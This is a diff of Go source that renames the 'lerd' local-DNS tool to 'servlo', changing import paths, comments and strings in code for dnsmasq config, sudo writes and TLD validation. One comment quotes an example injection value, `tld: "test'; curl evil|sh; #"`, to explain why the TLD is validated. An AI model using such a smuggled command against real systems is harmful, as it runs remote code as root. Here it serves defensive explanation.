@@ -15,10 +15,10 @@ import (
 	"strings"
 	"time"
 
-	"github.com/geodro/lerd/internal/config"
+	"github.com/realrashid/servlo/internal/config"
 )
 
-// sudoersMarkerPath is a user-owned record of the sudoers drop-in lerd last
+// sudoersMarkerPath is a user-owned record of the sudoers drop-in servlo last
 // installed. /etc/sudoers.d is root-only (0750), so the invoking user cannot
 // read the drop-in back to compare content; without this marker InstallSudoers
 // would rewrite the file, and prompt for sudo, on every run. Overridable in tests.
@@ -172,7 +172,7 @@ func parseNameservers(path string) []string {
 }
 
 // sanitizeDNSIP returns ip if it is usable as an upstream DNS target inside the
-// lerd container netns, or "" if it should be filtered. Loopback, unspecified
+// servlo container netns, or "" if it should be filtered. Loopback, unspecified
 // and zoned addresses (e.g. fe80::...%18) are rejected — podman/netavark cannot
 // consume scoped addresses, and link-local zones are interface-bound anyway.
 func sanitizeDNSIP(ip string) string {
@@ -227,7 +227,7 @@ func configuredUpstreamDNS() []string {
 	return out
 }
 
-// WaitReady blocks until lerd-dns is accepting TCP connections on port 5300
+// WaitReady blocks until servlo-dns is accepting TCP connections on port 5300
 // (dnsmasq supports DNS over TCP), or until the timeout elapses.
 // Returns nil when ready, error on timeout.
 func WaitReady(timeout time.Duration) error {
@@ -240,11 +240,11 @@ func WaitReady(timeout time.Duration) error {
 		}
 		time.Sleep(100 * time.Millisecond)
 	}
-	return fmt.Errorf("lerd-dns not ready after %s", timeout)
+	return fmt.Errorf("servlo-dns not ready after %s", timeout)
 }
 
 // sudoWriteFile writes content to a system path by piping it through
-// `sudo tee <path>`. Earlier versions wrote a /tmp/lerd-sudo-XXXXXX
+// `sudo tee <path>`. Earlier versions wrote a /tmp/servlo-sudo-XXXXXX
 // staging file then ran `sudo cp tmp dst`, which required a sudoers rule
 // with a wildcard in the source argument. Modern strict sudo parsers —
 // sudo-rs (the Rust rewrite that Ubuntu 26.04 LTS made the default) and
@@ -284,7 +284,7 @@ func sudoWriteFile(path string, content []byte, mode os.FileMode) error {
 	return nil
 }
 
-// DefaultTLD is what lerd serves when the config names no TLD or names an
+// DefaultTLD is what servlo serves when the config names no TLD or names an
 // unusable one.
 const DefaultTLD = "test"
 
@@ -292,13 +292,13 @@ const DefaultTLD = "test"
 // be a TLD, and nothing else may reach the callers below.
 var tldPattern = regexp.MustCompile(`^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?$`)
 
-// ConfiguredTLD returns the TLD lerd serves, and refuses to return one that is
+// ConfiguredTLD returns the TLD servlo serves, and refuses to return one that is
 // not a DNS label.
 //
 // Everything that writes or reads a .tld route has to agree on this: the dnsmasq
-// address records, the lerd0 link, the dispatcher and the diagnostic that checks
+// address records, the servlo0 link, the dispatcher and the diagnostic that checks
 // them. The validation is not cosmetic: this value is interpolated into the shell
-// command of a root-owned systemd unit that lerd writes and starts through its own
+// command of a root-owned systemd unit that servlo writes and starts through its own
 // passwordless sudo grants, so a config.yaml carrying `tld: "test'; curl evil|sh; #"`
 // would otherwise be arbitrary code as root. Anything unusable falls back to the
 // default rather than reaching a shell.
@@ -310,13 +310,13 @@ func ConfiguredTLD() string {
 	return tld
 }
 
-// WriteDnsmasqConfig writes the lerd dnsmasq config to the given directory,
-// auto-detecting the right target based on whether `lerd lan:expose` is on.
+// WriteDnsmasqConfig writes the servlo dnsmasq config to the given directory,
+// auto-detecting the right target based on whether `servlo lan:expose` is on.
 //
 // When cfg.LAN.Exposed is false the config answers .test queries with
 // 127.0.0.1 / ::1, suitable for local-only use. When it's true the config
 // answers with the host's primary LAN IP (v4 + v6 when available) so remote
-// clients reach the actual nginx instance through the lerd-dns-forwarder
+// clients reach the actual nginx instance through the servlo-dns-forwarder
 // service.
 func WriteDnsmasqConfig(dir string) error {
 	target := "127.0.0.1"
@@ -408,7 +408,7 @@ func deriveV6Target(v4 string) string {
 	return primaryLANIPv6()
 }
 
-// WriteDnsmasqConfigFor writes the lerd dnsmasq config with `target` as the
+// WriteDnsmasqConfigFor writes the servlo dnsmasq config with `target` as the
 // IPv4 answer for `*.test`. An AAAA pair is derived (::1 locally, host's
 // global v6 when LAN-exposed). Upstreams come from the system; if none are
 // usable, the pasta default forwarder is used so .test routing keeps working.
@@ -432,7 +432,7 @@ func WriteDnsmasqConfigDual(dir, v4Target, v6Target string) error {
 	}
 
 	var sb strings.Builder
-	sb.WriteString("# Lerd DNS configuration\n")
+	sb.WriteString("# Servlo DNS configuration\n")
 	sb.WriteString("port=5300\n")
 	if len(upstreams) > 0 {
 		sb.WriteString("no-resolv\n")
@@ -446,5 +446,5 @@ func WriteDnsmasqConfigDual(dir, v4Target, v6Target string) error {
 		fmt.Fprintf(&sb, "address=/.%s/%s\n", tld, v6Target)
 	}
 
-	return os.WriteFile(filepath.Join(dir, "lerd.conf"), []byte(sb.String()), 0644)
+	return os.WriteFile(filepath.Join(dir, "servlo.conf"), []byte(sb.String()), 0644)
 }
